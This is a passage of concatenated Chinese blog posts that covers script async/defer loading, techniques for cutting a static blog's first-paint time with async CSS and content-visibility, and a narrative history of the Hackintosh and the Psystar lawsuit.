4，动态插入的脚本会默认同步加载和执行，除非显示声明 <code>async = true</code>。不过从 Firefox 4.0 开始，动态插入的脚本将会异步加载和执行，以和 IE、WebKit 行为保持一致（因此同步执行也一样需要显式声明 <code>async = false</code> ）；当 Opera 15 开始更换为基于 Chormium 开发（当时 Chromium 版本为 28）后，行为也变得和 IE、WebKit 一致。</li>\n</ul>\n<p>在 HTML5 规范中，这一问题终于被一劳永逸的解决了。在「<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#script-processing-model\">HTML Standard - 4.12.1.1 Processing Model</a>」中明确规定了浏览器应该如何处理动态插入的 <code>&lt;script&gt;</code>。对于传统的脚本（非 Module），大致处理流程如下所示：</p>\n<blockquote><p>本图由 Sukka 绘制，按照 CC BY-NC-SA 4.0 协议共享。使用时请遵守许可协议，注明出处、不得被用于商业用途（除非获得书面许可）。</p></blockquote>\n<h2>尾声</h2>\n<p>Google Analytics 在 2013 年开始逐渐用 <code>analytics.js</code> 代替 <code>ga.js</code> 时，市面上同时存在有现代的支持 HTML5 和 <code>async</code> 属性的浏览器、和不支持 <code>async</code> 属性的「前 HTML5 时代的」古董浏览器。如果要保证在所有的浏览器上 Google Analytics 都能被异步地加载和执行，动态地将 <code>&lt;script&gt;</code> 标签插入 DOM 中、并显式声明 <code>async = true</code> 无疑是唯一的方法。随着古董浏览器逐渐退出人们的视线、实现 <code>async</code> 属性的浏览器在全球的份额已经达到了 98.08%，Google 终于开始直接用 <code>&lt;script async&gt;</code> 标签引入 Google Tag Manager。</p>\n<div class=\"license\">\n<div class=\"license-title\">从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/script-async-defer/\">https://blog.skk.moe/post/script-async-defer/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-10-13</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/script-async-defer/"},{"title":"再快一点，再快一点 —— 优化博客白屏时间的实践","date":"2020-10-03 08:40:00","description":"\n<p>两个多月以前，我写了一篇文章 <a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">介绍我是如何优化我的博客的</a>，但是我对于博客的白屏时间仍然不满意。过去一个月我在博客上进行了一系列优化实践，终于成功将博客的白屏时间减少了将近 50%，这篇文章就来记录优化的过程和方案。</p>\n<h2>确定和分析白屏时间</h2>\n<p>First Paint 和 First Contentful Paint 是衡量白屏时间的重要指标。Google Chrome 团队提供了专门的库 <code>web-vitals</code> 用于在浏览器中衡量这些指标。直接在本地开发环境中引入该库：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">\"module\"</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">  <span class=\"hljs-keyword\">import</span> {getFCP, getLCP, getFID} <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'https://unpkg.com/web-vitals@0.2.4/dist/web-vitals.es5.min.js?module'</span>;</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 First Contentful Paint</span></span><span class=\"javascript\">  getFCP(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 Largest Contentful Paint</span></span><span class=\"javascript\">  getLCP(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 First Input Delay</span></span><span class=\"javascript\">  getFID(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>访问在本地运行的 Hexo Server 实例（<code>http://localhost:4000</code>），打开任意一篇文章，然后在 Dev Tools 中切换到「Performance」Tab 中限制 Network 和 CPU 性能：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/1.png\" width=\"1276\" height=\"279\" class=\"lazy post-img\"></p>\n<blockquote><p>进行性能测试时，模拟移动端的网络和性能是非常重要的。然而，Firefox 的 Dev Tools 至今很遗憾地没有实现这个功能（许多类似的 Feature Request 在 Bugzilla 已经 stall 数个月了）。这也是为什么我钟情于使用 Chromium Based 的浏览器开发的原因。</p></blockquote>\n<p>刷新页面，Console 中会输出三个数值（单位均为毫秒）：</p>\n<pre><code class=\"hljs plaintext\">FCP 1537.4400000000605LCP 1921.934FID 3.559999997378327</code></pre>\n<p>可以看到，First Contentful Paint 时间在 1.5 秒左右、而 Largest Contentful Paint（最大的可视元素，此时是文章的头图）是 1.9 秒。考虑到这是在本地环境、TTFB 只受模拟的「Fast 3G」限制，不难想象在实际访客体验中白屏时间绝对不止 1.5 秒。</p>\n<h2>分析性能瓶颈</h2>\n<p>肯定了问题的确存在，接下来就需要寻找性能瓶颈了。在「Performance」Tab 中将 CPU 性能修改为「6x slowdown」放大性能瓶颈，然后用「Start profiling and reload page」按钮刷新页面和获取火焰图：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/2.png\" width=\"1386\" height=\"946\" class=\"lazy post-img\"></p>\n<p>其中，Layout 占据的时间（117.43ms）比 Parse HTML（22.48ms）和 Recalculate Style（20.37ms）都要长得多，基本可以认定这就是性能瓶颈了。接下来判断是页面什么元素导致了 Layout 的性能瓶颈。对博客中其它页面进行 Profiling，并将火焰图进行对比：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/3.png\" width=\"860\" height=\"450\" class=\"lazy post-img\"></p>\n<blockquote><p>从左往右分别是 「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」、首页、「<a href=\"https://blog.skk.moe/post/hello-world/\">Hello World</a>」页面的火焰图和 Layout 用时。</p></blockquote>\n<p>根据火焰图和三个页面的特征，猜测是文章内容部分导致了 Layout 用时过长。为了加以验证，在 CSS 中使用 <code>display: none</code> 将文章内容直接从 DOM 中离线，然后重新生成火焰图。</p>\n<blockquote><p>在页面渲染时， <code>display: none</code>  的元素会直接从 DOM 中离线、不参加 Style 和 Layout。</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/4.png\" width=\"1194\" height=\"946\" class=\"lazy post-img\"></p>\n<p>将文章内容设置 <code>display: none</code> 后，Layout 性能直接提升了三倍，所以可以确认性能瓶颈就是文章内容的 Layout 了。</p>\n<h2>优化白屏时间</h2>\n<p>文章内容的 Layout 时间比较长，而文章内容在加载完之前不会触发 First Paint。所以如果需要缩短白屏时间，就必须缩短文章内容 Layout 的用时。</p>\n<p>Layout 是浏览器计算元素几何信息的过程：元素的大小、在页面中的位置。Layout 性能一般和 DOM 元素数量、布局复杂性、布局模型有关。对于 DOM 元素数量这一点没有什么好的解决方案 —— 文章就这么长、每个段落就是一个 <code>&lt;p&gt;</code> 元素；对于文章内容也没有布局复杂性或布局模型可言。因此这是一条死路。</p>\n<p>直接对着自己的博客动死脑筋是行不通的，我决定先和其他的内容网站的 Layout 性能对比一下：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/5.png\" width=\"960\" height=\"500\" class=\"lazy post-img\"></p>\n<blockquote><p>上图左一为知乎专栏文章「<a href=\"https://zhuanlan.zhihu.com/p/25800461\">PWA 在饿了么的实践经验</a>」的火焰图；左二为 QuQuBlog「<a href=\"https://imququ.com/post/optimize-tls-handshake.html\">TLS 握手优化详解</a>」的火焰图；左三为 dev.to 的「<a href=\"https://dev.to/mustapha/css-grid-illustrated-introduction-52l5\">CSS Grid: illustrated introduction</a>」的火焰图。</p></blockquote>\n<p>和其它内容网站比较发现，当页面包含较长篇幅的内容时，「CPU 6x slowdown」下 Layout 用时大抵在 100ms 到 200ms 左右。我的博客内容页面 Layout 用时在 120ms 属于正常范围、基本没有进一步优化的空间。</p>\n<p>不过，我在看 dev.to 的火焰图时发现了一个很有趣的现象：虽然完整 DOM 的 Layout 用时在 123.70ms、但是却发生在 First Paint 和 First Contentful Paint 之后。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/6.png\" width=\"1090\" height=\"314\" class=\"lazy post-img\"></p>\n<p>结合截图和火焰图可以发现，dev.to 在加载文章页面时，先只渲染 Navbar、触发 First Paint、结束白屏；之后继续 Parse HTML、渲染页面主体内容；最后是 Lazyload 后的文章头图、触发 Largest Contentful Paint。这种思路在 H5、小程序中都是很常见：使用 Placeholder （被称为 AppShell）缩短白屏时间、然后再通过 AJAX 获取数据填充到页面上。但是静态博客和小程序最大的区别就是不需要获取数据、文章内容是直接包含在 HTML 中返回的，所以在博客上实践这样的思路需要做一些改变。</p>\n<p>我的做法则是将 CSS 拆分，将 Navbar 和右下角 Fab 按钮的 CSS 提取出来、内联在 HTML 中、当页面加载时就可以 Style &amp; Layout。同时为页面主题内容添加 <code>display: none</code> 使其在 DOM 中离线，使其不影响 First Paint；页面主体内容的 CSS（包括  <code>display: block</code>） 拆分成独立的 CSS。由于 CSS 是「渲染阻塞（Render Blocking）」的资源，浏览器在 Parse HTML 时如果遇到 CSS 就会开始请求、并在 CSS 下载完成之前不会开始 Style &amp; Layout。因此，需要一个小 trick 实现异步加载 CSS（使 CSS 不再阻塞渲染）：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span> <span class=\"hljs-attr\">media</span>=<span class=\"hljs-string\">\"print\"</span> <span class=\"hljs-attr\">onload</span>=<span class=\"hljs-string\">\"this.media='all';this.onload=null\"</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">noscript</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">noscript</span>&gt;</span></code></pre>\n<p>带有 <code>[media=print]</code> 属性的 CSS 仍然会以低优先级加载，但并不会直接参与 Style &amp; Layout、因此不会阻塞渲染。当 CSS 文件下载后触发 <code>onload</code> 事件、将 <code>media</code> 属性改为 <code>all</code>、使 CSS 在当前页面生效。</p>\n<p>为了使白屏不显得枯燥，我还加了一个「加载中」的闪烁动画，使用 <code>animation-delay</code> 延迟 0.6 秒显示。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/9.png\" width=\"813\" height=\"849\" class=\"lazy post-img\"></p>\n<p>不过使用这种方案需要注意两个问题。一是当页面内容被 <code>display: none</code> 后、页面的高度会小于 viewport、因此浏览器不会展示滚动条；当页面内容被覆盖为 <code>display: block</code> 后、浏览器会重新展示滚动条、导致抖动，因此需要为 <code>&lt;html&gt;</code> 添加 <code>overflow-y: scroll</code>。另一个问题是新的 CSS 生效时会触发新的 Style &amp; Layout、可能会导致已经渲染过的 Navbar 和 Fab 按钮被再次 Layout，造成性能浪费；解决方案是使用「<a href=\"https://drafts.csswg.org/css-contain/\">CSS Containment</a>」草案中引入的 <code>contain</code> 属性，通过在 CSS 中显式声明当前元素及其后代与 DOM 的关系，当浏览器重新计算样式和布局时只会影响有限的 DOM。截至本文写就，Edge（Chromium Based）、Firefox、Chrome 都已经对 <code>contain</code> 属性提供了支持。关于 CSS Containment 的用法，可以参考 <a href=\"https://developer.mozilla.org/en-US/docs/Web/CSS/contain\">MDN 上对 contain 的说明</a>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/7.png\" width=\"800\" height=\"368\" class=\"lazy post-img\"></p>\n<p>同时，如果使用异步加载 CSS，那么页面主体内容的显示时机就会受到两个因素制约 —— 除 Style &amp; Layout 外、还有 CSS 的加载。为了尽可能消除 CSS 加载对文章内容显示的影响，我为 CSS 设置了 HTTP/2 Push，这样 CSS 能够和 HTML 同时到达浏览器、但不会马上参与 First Paint 的 Style &amp; Layout。关于 HTTP/2 Push 的更多细节，可以参考我的文章「<a href=\"https://blog.skk.moe/post/http2-server-push/\">静态资源递送优化：HTTP/2 和 Server Push</a>」。</p>\n<p>实践的效果妙不可言：First Paint 之前的 Style &amp; Layout 用时加起来也不超过 50ms、几乎 HTML 一下载完就可以看到 Navbar。当 <code>defer.css</code> 加载完、样式和布局计算完后文章内容即绘制到屏幕上。如果 <code>defer.css</code> 出于某种原因没有及时加载（如 User-Agent 不支持 HTTP/2 Push、<code>defer.css</code> 未能命中缓存），那么「加载中…」就会展示出来，使访客不会认为页面失去响应。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/8.png\" width=\"1106\" height=\"945\" class=\"lazy post-img\"></p>\n<h2>尝试新属性</h2>\n<p>虽然减少了白屏时间，但是长篇幅的内容的布局计算仍然非常耗时；当文章越来越长时，用户仍然可能会对「加载中」失去耐心。不过 Chromium 85 开始对一些 CSS Containment 草案中的 CSS 属性（如 <code>content-visibility</code>）提供支持。当一个元素被声明  <code>content-visibility</code> 属性后，如果这个元素不在 viewport 中、浏览器就不会计算其后代元素样式和属性，从而大幅节省 Style &amp; Layout 耗时。目前，仅 Chrome/Chromium 85 提供对该属性的支持（没错，Firefox 把这个 Feature 也扔进「值得一试」里了）。更多关于 <code>content-visibility</code> 的介绍可以查看 <a href=\"https://web.dev/content-visibility/\">web.dev 上的相关文章</a>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/10.jpg\" width=\"1600\" height=\"1108\" class=\"lazy post-img\"></p>\n<p>使用 <code>content-visibility</code> 属性需要将页面内容分块。于是我写了一个 Hexo 插件，在文章内容渲染时将每两个 <code>&lt;h2&gt;</code> 之间的内容分为一块、用 <code>&lt;div class=\"story\"&gt;</code> 包裹起来。然后为 <code>.story</code> 声明 <code>content-visibility: auto</code>。</p>\n<p>需要注意的是，<code>content-visibility</code> 绕过的是不在当前 viewport 的元素的后代元素的样式和布局、只保留一个元素盒子。如果没有显式声明元素的高度的话那么这个元素的高度就是 0 了。虽然 Chrome/Chromium 在实现 <code>content-visibility</code> 时会试图避免 Curative Layout Shift（在元素即将进入 viewport 时就开始渲染），但是滚动条的高度会发生改变。所以「CSS Containment」草案中还提出了一个新属性 <code>contain-intrinsic-size</code>、用于声明一个「元素盒子」的高度。这个属性不影响渲染后元素的实际尺寸，实际使用时只需要预估高度即可：</p>\n<pre><code class=\"hljs css\"><span class=\"hljs-selector-class\">.story</span> {  <span class=\"hljs-attribute\">content</span>-<span class=\"hljs-attribute\">visibility</span>: auto;  contain-intrinsic-size: <span class=\"hljs-number\">1000px</span>; // 不靠谱地取个 <span class=\"hljs-number\">1000px</span>}</code></pre>\n<blockquote><p><code>content-visibility</code> 除了可以改善 Layout 性能外，值得一提的还有其另一个取值 <code>hidden</code>。众所周知 <code>display: none</code> 会使元素「离线」，元素会从 DOM 中消失、同时渲染状态也会随之消失；而 <code>visibility: hidden</code> 只是会隐藏元素、而元素本身依然保留在 DOM 中，渲染状态也保留。而 <code>content-visibility: hidden</code> 则介于两者之间，元素会从 DOM 中消失、但是保留渲染属性。</p></blockquote>\n<p>利用 <code>content-visibility</code> 和 <code>contain-intrinsic-size</code> 后，文章的 Layout 时间从 120ms 减少到了 70ms、减少了将近 40%，只能希望越来越多的浏览器能够提供对这两个属性的支持了。</p>\n<div class=\"license\">\n<div class=\"license-title\">再快一点，再快一点 —— 优化博客白屏时间的实践</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/improve-fcp-for-my-blog/\">https://blog.skk.moe/post/improve-fcp-for-my-blog/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-10-03</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/improve-fcp-for-my-blog/"},{"title":"黑苹果的历史","date":"2020-09-02 21:45:00","description":"\n<h2>楔子：第一台「黑苹果」</h2>\n<p>如果按照「黑苹果」的定义 —— 在一台没有苹果 Logo 的电脑上运行苹果公司开发的操作系统 —— 那么全世界第一台「黑苹果」应该诞生于 24 年前。1996 年，苹果将 Macintosh 电脑切换到 IBM 的 PowerPC 架构。时任苹果 CEO Gil Amelio 借此机会，与一些使用和 Macintosh 同款 CPU 和主板的厂商（如摩托罗拉）签约，授权他们的 PC 预装苹果的 Macintosh System 7（即 Classic Mac OS 7）。</p>\n<p>然而，1997 年 7 月发生了两件事。一件事是乔布斯回到苹果、被正式任命为苹果公司的 CEO，另一件事是 7 月 26 日 Mac OS 8 正式发布。</p>\n<p>Mac OS 8 并没有带来革命性的更新 —— 这个版本原本应该被命名为 Mac OS 7.7 。但是苹果公司前 CEO 同第三方厂商签订的系统授权协议是基于 Macintosh System 7 的。乔布斯选择发布 Mac OS 8.0，巧妙地利用命名和版本号的不同，直接把后续的服务和协议一起中断掉了。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/1.png\" width=\"405\" height=\"599\" class=\"lazy post-img\"></p>\n<blockquote><p>摩托罗拉生产的 StarMax 兼容机，可以直接安装 System 7。</p></blockquote>\n<h2>从 PowerPC 到 x86</h2>\n<p>把 Macintosh System 7 的授权协议理解为黑苹果有些取巧了。要谈现代的黑苹果，那么一定不能无视苹果迈向 x86 的道路，所以让我们把时间再倒回去 5 年吧。</p>\n<p>1992 年 2 月 14 日，苹果开展了一项秘密计划「Star Trek」，将 Macintosh System 7（Classic Mac OS 7）连同其应用程序迁移到 Intel 架构兼容的 PC 机（采用 Intel 486 处理器）上，并要求在 12 月 1 日就拿出第一台原型机。苹果的工程师夜以继日的重构，终于赶在 Deadline 之前完成了 System 7 和 QuickTime 的移植。但是随着苹果时任 CEO John Sculley 离开公司，接任的 CEO Michael Spindler 更青睐 PowerPC 架构，Star Trek 随即被取消。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/2.png\" width=\"640\" height=\"480\" class=\"lazy post-img\"></p>\n<blockquote><p>Macintosh System 7 的界面截图</p></blockquote>\n<p>虽然 Star Trek 被取消，但是仍然有部分苹果工程师努力将 Mac OS 移植到 x86 平台，其中成果最显著的是工程师 John Kullman，他在 2001 年 12 月成功将 Mac OS X 移植到了 x86 的 Quora PC 上。被称为「Mac OS X 之父」的 Bertrand Serlet（他后来成为 10.4 Tiger、10.5 Leopard 和 10.6 Snow Leopard 主要负责人）得知此事后与 John Kullman 会面，希望他将 Mac OS X 移植到一台索尼 VAIO 笔记本上。John Kullman 在当天晚餐之前就完成了任务。第二天，乔布斯就带着这台 VAIO 飞往东京，与索尼时任社长安藤国威会面，商讨有关在索尼的 VAIO 上运行 Mac OS X 的事宜，但谈判无疾而终。</p>\n<p>即使「索粉」乔布斯未能和索尼达成合作，苹果内部仍然于 2002 年进行了一项新的秘密计划「Marklar」，目的是继续维持 Mac OS X 与 x86 的兼容性。直到 2005 年 6 月 6 日，苹果在旧金山莫斯康展览中心举办了 WWDC 2005，乔布斯正式宣布他们将把个人电脑产品线 <a href=\"https://www.apple.com/newsroom/2005/06/06Apple-to-Use-Intel-Microprocessors-Beginning-in-2006/\">从 PowerPC 架构转变为 Intel 架构</a>。2006 年 1 月 10 日，苹果发布了第一台使用 Intel Core（英特尔酷睿）的 MacBook Pro，代替先前的产品线 PowerBook。12 月 28 日，苹果发布了 Mac Mini，同样搭载了 Intel Core 处理器。2007 年 4 月 5 日，苹果推出 Boot Camp（启动转换），4 月 24 日，苹果推出 17 寸的 MacBook Pro，5 月 16 日，苹果推出 12 寸的 MacBook 以代替 iBook 产品线，7 月 5 日，苹果推出 iMac 以代替 eMac 产品线，8 月 7 日，苹果推出新的高端电脑产品线 Mac Pro。2009 年 8 月，苹果推出 Mac OS X 10.6 Snow Leopard，这是第一个只支持 x86 的 Mac OS X，宣告苹果正式放弃了对 PowerPC 的支持。</p>\n<h2>黑苹果的第一道曙光</h2>\n<p>回到 WWDC 2005，苹果向开发者推出了搭载 Intel 处理器的 DTK（Dev Transition Kit），搭载了兼容 Intel 的 Mac OS X 10.4.1。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/3.png\" width=\"640\" height=\"480\" class=\"lazy post-img\"></p>\n<blockquote><p>Mac OS X 10.4.1 Tiger 开发版运行在搭载了 Intel 处理器的 DTK 上。</p></blockquote>\n<p>很快，就有人尝试在非苹果硬件上运行开发版的 Mac OS X，但是该系统拒绝在普通的 PC 上运行：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/4.png\" width=\"724\" height=\"400\" class=\"lazy post-img\"></p>\n<blockquote><p>当试图在非 Mac 平台上安装开发版的 Mac OS X Tiger 10.4.1 时会看到上图的提示信息：Darwin/x86 不支持你的硬件配置。</p></blockquote>\n<p>当时，将 Mac OS X Tiger 10.4.1 运行在普通的 PC 上有三大障碍：第一是指令集，DTK 内置的 <a href=\"https://ark.intel.com/content/www/cn/zh/ark/products/27484/intel-pentium-4-processor-660-supporting-ht-technology-2m-cache-3-60-ghz-800-mhz-fsb.html\">Intel Pentium 4 660 CPU</a> 支持 SSE-3 指令集，但是 2004 年前后的 PC 常见的处理器都不包括该指令集；其次是芯片组，Mac OS X 开发版只支持 Intel 915G/ICH6 芯片组；最后，当时的苹果的 DTK 使用了 Infineon TPM 安全芯片。讽刺的是，最难克服的障碍其实不是硬件或安全芯片，而是指令集。</p>\n<p>目前可考的第一台成功的黑苹果诞生于 2005 年 8 月 10 日，那一天 <a href=\"https://web.archive.org/web/20051018182314/http://hardmac.com/news/2005-08-10/\">HardMac 网站收到匿名开发者发来的两段视频</a>，视频中展示了 Mac OS X 10.4.1 Tiger 运行在搭载 Pentium M 735 处理器的 Mitac 8050D 笔记本上。</p>\n<blockquote><p>值得一提的是，2006 年 1 月 10 日苹果发布 MacBook Pro，相比传统 x86 主板使用 BIOS 引导（Legacy），MacBook Pro 使用了 UEFI 引导方式。</p></blockquote>\n<p>2006 年 2 月 14 日，「The Guru」团队的成员 Maxxuss（crg92）发布了首个 Patch 补丁。通过该补丁修补 XNU 内核即可解除引导和安装限制、在任何内置 SSE-2 指令集的 Intel 处理器上运行 Mac OS X 10.4.4，今天 <a href=\"https://www.insanelymac.com/forum/topic/9071-1044-security-broken/?page=1\">在 InsanelyMac 上仍然可以找到当时的帖子</a>。几小时之后苹果发布了 10.4.5 版本的 Mac OS X，又过了两周 crg92 就放出了新的针对 10.4.5 的补丁。</p>\n<p>苹果随后的几个月内发布了 Mac OS X 10.4.6 和 10.4.7，OSx86 社区成员设法将这些系统中的新版本的内核替换为 10.4.4 和 10.4.5 的旧内核、实现将这些新版本的系统安装在 PC 上。但是从 10.4.8 开始，苹果开始更广泛地使用 SSE-3 指令集，意味仅仅通过修补 XNU 内核已经无法再兼容只支持 SSE-2 指令集的处理器（如早期的奔腾 4）。来自新西兰的 macOS、iOS 开发者与逆向工程师 <a href=\"http://mifki.com/\">Mfiki</a>（Vitaly Pronkin）于 2006 年 12 月 24 日放出了一个新的更精简的 Patch 以使 XNU 内核兼容 SSE2；而开发者 Semthex 则制作了一个通过 SSE-2 模拟 SSE-3 的指令集模拟器。 </p>\n<p>Mac OS X 10.5 Leopard 于 2007 年正式发布，随后 BrazilMac 发布了一个通用补丁。用户可以通过购买 Mac OS X 零售版的安装光盘、打上补丁即可让 XNU 内核运行在普通 Intel PC 上。之后，数个黑客和开发者（如 Lorem、SynthetiX、ToH、StageXNU 团队）都纷纷释出了内核补丁。同时，基于这些补丁制作的 Mac OS X「发行版」开始出现，如 iATKOS、<a href=\"https://www.insanelymac.com/forum/topic/77069-kalyway-1051-dvd-release-the-official/\">KALYWAY</a> 和 <a href=\"http://ipcosx86.wikidot.com/\">iPC</a>。</p>\n<blockquote><p>之后随着 EFI 引导方法的流行，这些发行版都逐渐改为在系统中内置 Boot-132 或 Chameleon。</p></blockquote>\n<h2>中场休息：对美国法院的一瞥</h2>\n<p>2008 年 4 月，一家名为 Psystar 的公司在美国佛罗里达州注册。这家公司计划公开销售 Intel PC，预装内置 BrazilMac 补丁的 Mac OS X 10.5 Leopard。这种 PC 一开始被称为「OpenMac」，很快又被更名为「Open Computers」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/6.jpg\" width=\"450\" height=\"450\" class=\"lazy post-img\"></p>\n<blockquote><p>Pystar 的「OpenMac」</p></blockquote>\n<p>2008 年 7 月 3 日，苹果在加利福尼亚州地区法院起诉 Pystar 公司，声称 Pystar 公司侵犯了苹果的版权、违反了数字千年版权法案（DMCA），「避开、绕过、移除、解扰、解密、停用、破坏苹果保护机制」。</p>\n<p>2008 年 8 月 28 日，Pystar 公司在佛罗里达州地区法院起诉苹果，声称苹果公司存在垄断和其它不正当竞争行为。2008 年 11 月 18 日，Pystar 公司的起诉被驳回。</p>\n<p>2009 年 2 月 5 日，<a href=\"http://www.computerworld.com/s/article/9127579/Mac_clone_maker_wins_legal_round_against_Apple\">Pystar 公司赢得苹果第一轮的版权诉讼</a>。<strong>这一判例意味着苹果的 EULA 中的「禁止在一台没有苹果 Logo 的电脑上运行苹果公司开发的操作系统」条款可能是没有法律效力的</strong>。</p>\n<p>2009 年 4 月，苹果的新闻发言人表示 Pystar 公司没有依法公开任何财务信息（利润、资产、负债）。Pystar 的 CEO 兼创始人对此拒绝置评，并仍然拒绝透露任何财务信息。</p>\n<p>2009 年 5 月 26 日，Pystar 公司申请破产保护，试图通过破产保护法案拖延苹果的诉讼。在申请破产期间，Pystar 公司仍然在销售预装 Mac OS X 的 PC，因此 2009 年 6 月法院解除了苹果的诉讼中止，使苹果可以继续起诉 Pystar 公司。2009 年 8 月 12 日，Pystar 公司的破产保护申请被佛罗里达地区法院驳回。</p>\n<p>2009 年 11 月 13 日，加利福尼亚州地方法院判定 Pystar 违反了 DMCA 和侵犯了苹果的版权，定于 12 月 14 日举行听证会。2009 年 12 月 15 日，加利福尼亚州法院发表永久性禁令，禁止 Pystar 制造、分发、协助任何人安装任何版本（包括未来版本）的 Mac OS X。2010 年 1 月 16 日，Pystar 公司提起上诉。2012 年 5 月 14 日，最高法院驳回了 Pystar 公司的上诉，苹果赢得了最终的诉讼。</p>\n<h2>向 Chameleon（变色龙）进发</h2>\n<p>回到 WWDC 2005 上发布的搭载 Intel DTK，内置了一个名为 Boot-132 的 UEFI Bootloader 用于加载 XNU 内核。。当时 Intel 的 UEFI 还是新鲜产物、几乎所有的 PC 都在使用 BIOS 引导（也就是现在被称为 Legacy BIOS 的引导方法）。Boot-132 后来随 Mac OS X 10.4.8 的 XNU 内核一起开源，所以在 2007 年，David Elliott 基于 Linux 的 GRUB Bootloader 和苹果 Boot-132 的源码开发了一个初级的 Bootloader，能够为使用 Legacy BIOS 引导的 PC 提供一个「模拟 UEFI」环境用于加载 XNU 内核。</p>\n<blockquote><p>除了 Boot-dfe，David Elliott 的作品还包括初版的 <a href=\"http://tgwbd.org/darwin/extensions.html#NullCPUPowerManagement\">NullCPUPowerManagement</a>，用于兼容苹果的电源管理 AppleIntelCPUPowerManagement。</p></blockquote>\n<p>2008 年，Voodoo 团队（原 StageXNU 团队，你应该记得在上个章节中看到过这个名字）将 David Elliott 开发的「模拟 UEFI」实现与苹果原始的 Boot-132 结合，制作了 Chameleon（变色龙）项目。随着 Chameleon 的不断迭代更新，许多功能如注入 Device Properties（设备属性）、加载 Kernel Extension（内核扩展，即 kext）、修补 ACPI、模拟 SMBIOS 机型、图形化界面的启动菜单都一一被支持。Voodoo 团队还开发了数个 kext 如 VoodooPower、VoodooSDHCI 以及在 Hackintosher 中耳熟能详的 VoodooHDA 和 VoodooPS2Controller。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/5.png\" width=\"419\" height=\"330\" class=\"lazy post-img\"></p>\n<blockquote><p>在 QEMU 虚拟机中通过 Chameleon 2.1.0 引导 PureDarwin，该版本的变色龙已经支持图形化引导界面。</p></blockquote>\n<p>由于变色龙的出现，越来越少的人选择反编译修改 XNU 内核、而是通过 Bootloader 替换 DSDT、注入设备属性和 kext。<strong>考虑到数字千年版权法（DMCA）禁止修改并分发 macOS 